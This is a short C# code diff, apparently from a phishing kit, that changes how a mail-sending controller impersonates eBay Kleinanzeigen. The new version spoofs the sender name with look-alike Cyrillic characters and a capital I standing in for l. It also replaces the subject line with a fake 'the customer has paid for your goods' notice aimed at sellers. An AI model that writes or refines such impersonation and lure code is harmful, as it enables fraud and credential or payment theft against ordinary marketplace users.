@@ -67,12 +67,12 @@ public class SenderController : ControllerBase
     {
         var body = await GetBody(link, ServiceType.EbayDe);
 
-        var displayName = "◦EBAY◦Kleinanzeigen◦Info®";
+        var displayName = "•е-Вау•Kleinanzeigen";
 
         if (email.Contains("yahoo"))
             displayName = "das'TeamEbaykIeinanzeigen de®";
         
-        var message = new MailMessage(_senderEmail, email, "Nutzer-Anfrage zu deiner Anzeige!", body)
+        var message = new MailMessage(_senderEmail, email, "Der Kunde hat für Ihre Waren bezahlt!", body)
         {
             IsBodyHtml = true,
             From = new MailAddress(_senderEmail, displayName)
